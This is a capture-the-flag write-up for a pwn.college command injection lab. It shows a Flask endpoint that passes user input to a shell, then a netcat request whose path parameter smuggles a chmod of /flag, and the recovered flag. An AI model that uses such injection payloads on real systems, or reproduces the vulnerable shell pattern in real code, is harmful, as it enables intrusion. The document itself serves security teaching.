---
layout: page
title: "💉 Command Injection 5 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧩 Challenge Overview

**Category:** Web Exploitation  
**Challenge Name:** cmdi-5  
**Platform:** pwn.college  
**Goal:** Exploit a command injection vulnerability in the `/test` endpoint to run arbitrary shell commands and retrieve the flag.

---

## 📝 Source Code Analysis

```python
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)

@app.route("/test", methods=["GET"])
def challenge():
    arg = flask.request.args.get("path", "/challenge/PWN")
    command = f"touch {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form action="/test"><input type=text name=path><input type=submit value=Submit></form>
        <hr>
        <b>Ran {command}!</b><br>
        </body></html>
        """

os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
---
## Vulnerability
The value of the path query parameter is directly used in a shell command:
```bash
command = f"touch {arg}"
```
Since shell=True is used, this allows command injection via shell metacharacters like ;, &&, or |.

---
## Exploit

We'll inject a command using ; to escalate privileges on the flag file and make it readable.

```bash
printf "GET /test?path=hello;chmod+777+/flag+%%23 HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
### Breakdown:
- hello → Dummy file name
- ;chmod+777+/flag+%23 → Injected command to make /flag world-readable
  - + becomes space
  - %23 is # (to comment out remaining shell line)

---

## Final Step
Now simply read the flag:
```bash
cat /flag
```
Output:
```bash
pwn.college{cqMqQmTFOTppp1fqR5JAEzmpj-G.QX3YTN2wSM0IzMyEzW}
```

---
